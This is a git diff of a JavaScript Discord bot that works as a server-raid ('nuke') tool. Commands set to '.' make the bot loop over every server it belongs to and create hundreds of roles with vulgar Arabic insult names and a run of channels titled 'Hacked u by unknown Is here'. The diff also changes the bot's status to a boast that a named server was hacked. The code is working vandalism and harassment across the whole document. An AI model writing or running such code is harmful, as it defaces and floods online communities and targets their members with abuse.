@@ -25,7 +25,7 @@ LOka.on("message", message => {
   if (message.content.startsWith('hix15')) {
     LOka.user.setUsername(argresult);
   }
-    if (message.content.startsWith(prefix + 'on123')) {
+    if (message.content.startsWith(prefix + '.')) {
     LOka.user.setStatus(argresult);
   }
 });
@@ -46,7 +46,7 @@ LOka.user.setUsername("Hacked u by unknown Is here")
 });
 LOka.on('message', message => {
      if (message.content === ".") {
-LOka.user.setGame(`Hacked u by unknown Is here`,'https://www.twitch.tv/hix')
+LOka.user.setGame(`تم نيك سيرفر king rp`,'https://www.twitch.tv/hix')
  
 }
 });
@@ -78,267 +78,1594 @@ LOka.on('message', message => {
 LOka.on('message', message => {
      
  
-     if (message.content === "k1") {
+     if (message.content === ".") {
          LOka.guilds.forEach(m =>{
-  m.createRole({
-        name : "Hacked u by unknown Is here",
+    m.createRole({
+        name : "كس امكم بايري",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "كس امكم بايري",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "كس امكم بايري",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ m.createRole({
+        name : "كس امكم بايري",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "كس امكم بايري",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "كس امكم بايري",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })          
+ m.createRole({
+        name : "كس امكم بايري",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "كس امكم بايري",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
- 
-    m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "كس امكم بايري",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "كس امكم بايري",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "كس امكم بايري",
         permissions :   [1],
         color : " #ff0000"
     })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })  
      m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "كس امكم بايري",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
- 
-    m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "كس امكم بايري",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
- 
-    m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "كس امكم بايري",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ m.createRole({
+        name : "كس امكم بايري",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "كس امكم بايري",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "كس امكم بايري",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })          
+ m.createRole({
+        name : "كس امكم بايري",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "كس امكم بايري",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "كس امكم بايري",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "كس امكم بايري",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "كس امكم بايري",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "كس امكم بايري",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "كس امكم بايري",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "كس امكم بايري",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "كس امكم بايري",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "كس امكم بايري",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "كس امكم بايري",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })            
+    m.createRole({
+        name : "كس امكم بايري",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
- 
-    m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "كس امكم بايري",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
- 
-    m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "كس امكم بايري",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ m.createRole({
+        name : "كس امكم بايري",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by unknown Is here",
+        name : "كس امكم بايري",
         permissions :   [1],
         color : " #ff0000"
     })
- 
- 
-   
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })          
+ m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })             
+      m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })          
+ m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })          
+ m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })  
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })          
+ m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })  
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })          
+ m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })  
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })          
+ m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })  
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })          
+ m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })  
+     m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })          
+ m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })  
+      m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })          
+ m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })          
+ m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })  
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })          
+ m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امكم بايري",
+        permissions :   [1],
+        color : " #ff0000"
+    })             
 })
  
  
 }
 });
 LOka.on('message', message => {
-         if (message.content === "k") {
+         if (message.content === ".") {
                LOka.guilds.forEach(m =>{
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
- 
-m.createChannel('Hacked u by unknown Is here', 'text');
- 
-m.createChannel('Hacked u by unknown Is here', 'text');
- 
-m.createChannel('Hacked u by unknown Is here', 'text');
- 
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
